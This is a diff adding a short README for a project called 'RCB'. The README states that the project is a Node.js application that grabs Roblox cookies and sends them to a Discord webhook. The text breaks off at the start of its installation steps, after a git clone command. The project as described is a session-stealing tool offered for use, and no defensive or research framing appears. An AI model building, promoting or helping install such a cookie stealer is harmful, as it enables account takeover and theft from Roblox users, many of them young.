@@ -1,0 +1,9 @@
+# RCB Project
+
+## Description
+This project is a simple Node.js application that grabs Roblox cookies and sends them to a Discord webhook.
+
+## Installation
+1. Clone the repository:
+   ```sh
+   git clone https://github.com/fresh/rcb.git
